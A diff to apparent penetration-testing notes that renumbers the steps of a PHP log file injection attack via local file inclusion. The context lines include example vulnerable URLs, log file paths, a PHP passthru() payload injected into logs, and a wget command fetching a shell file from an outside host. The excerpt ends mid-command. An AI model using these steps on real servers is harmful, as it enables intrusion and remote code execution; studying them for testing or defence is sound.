@@ -317,15 +317,14 @@ LFI vs LFD:
 
 **Exploitation: PHP Log File Injection**  
 
-Steps:
-1. Verify existence of LFI/LFD vulnerability.
+STEP #1: Verify existence of LFI/LFD vulnerability.
 ```
 domain.com/?p=somepage.txt
 domain.com/?p=pagename-whatever
 domain.com/?class=something&function=another 
 ```
 
-2. Figure out where the logfiles are. Example locations:
+STEP #2: Figure out where the logfiles are. Example locations:
 ```
 /usr/local/etc/php
 /etc/php.d/*.ini
@@ -341,7 +340,7 @@ domain.com/?class=something&function=another
 /var/log/httpd-error.log
 ```
 
-3. Send a malicious request to inject a payload into the logfile:
+STEP #3: Send a malicious request to inject a payload into the logfile:
 
   * _PHP passthru() function_: Execute an external program and display raw output
   * Attack vectors:
@@ -352,7 +351,7 @@ domain.com/?class=something&function=another
 <?php passthru(['ls -l']); ?>
 ```
 
-4. With command execution, use wget to upload your own files to the server:
+STEP #4: With command execution, use wget to upload your own files to the server:
 ```
 /var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
 OR
